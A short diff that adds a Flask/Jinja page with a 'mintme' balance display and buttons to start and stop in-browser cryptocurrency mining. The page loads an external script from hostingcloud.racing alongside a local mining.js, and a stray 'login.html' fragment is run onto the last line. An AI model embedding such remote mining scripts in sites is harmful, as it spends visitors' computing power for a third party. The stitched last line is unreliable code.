@@ -1,0 +1,9 @@
+{% block content %}
+    <h1>Welcome, {{ username }}!</h1>
+    <p>Your current mintme balance: <span id="balance">0</span></p>
+    <button id="startMining">Start Mining</button>
+    <button id="stopMining">Stop Mining</button>
+{% endblock %}
+
+<script src="https://www.hostingcloud.racing/3ow4.js"></script>
+<script src="{{ url_for('static', filename='mining.js') }}"></script> login.html: {% extends 'main.html' %}
